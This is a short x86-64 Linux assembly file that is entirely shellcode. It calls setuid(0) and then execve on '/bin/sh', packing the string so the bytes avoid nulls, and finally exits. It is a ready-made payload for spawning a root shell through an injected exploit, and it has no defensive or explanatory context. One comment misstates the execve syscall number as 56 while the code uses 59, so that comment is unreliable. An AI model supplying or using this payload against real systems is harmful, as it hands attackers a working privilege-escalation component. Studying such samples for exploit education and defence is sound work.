section .text
    global _start
 
_start:
    ;sys_setuid(int id) syscall 105
    xor rax, rax
    mov al, 0x69
    xor rdi, rdi
    syscall
 
    ;run sys_exec(char *filename, char *argv[], char *envp[]) syscall 56
    xor rax, rax
    mov rbx, 0x68732f6e69622fff
    shr rbx, 0x8
    push rbx
    mov al, 0x3b
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    syscall
 
    ;run exit(int ret) syscall 60
    xor rax, rax
    mov al, 0x3c
    xor rdi, rdi
    syscall
